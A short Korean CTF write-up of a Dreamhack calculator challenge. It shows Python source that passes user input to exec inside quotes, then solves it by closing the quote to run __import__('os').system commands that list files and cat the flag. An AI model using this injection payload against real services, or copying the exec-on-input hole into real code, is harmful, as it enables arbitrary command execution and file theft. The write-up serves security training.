## 문제

**문제 설명
Calculator in the hands of an expert can be dangerous and if it is in the hands of a fool it is just a calculator. Can you show me if you are a fool or if you are dangerous?**

```python
┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0316]
└─$ cat chall.py

print("=== Calculator ===")
print("Enter math expressions")
print("Type 'exit' to quit")
print("=" * 25)

while True:
    user_input = input(">>> ").strip()

    if user_input.lower() == 'exit':
        print("Goodbye!")
        break

    try:
        result = exec('"' + user_input + '"')
        if '=' not in user_input and any(op in user_input for op in ['+', '-', '*', '/']):
            print(f"= {eval(user_input)}")
    except Exception as e:
        print(f"Error: {e}")
```

## 해결

SQL Injection에서 홑따옴표(`'`)를 닫아서 쿼리를 조작하는 것처럼, `user_input` 안에 큰따옴표를 직접 입력.
현재 파이썬 스크립트는 `exec('"' + user_input + '"')` 형태로 코드를 실행.

```bash
>>> $ "+__import__('os').system('ls')+"
chall.py
flag.txt
>>> $ "+__import__('os').system('cat ./flag.txt')+"
```
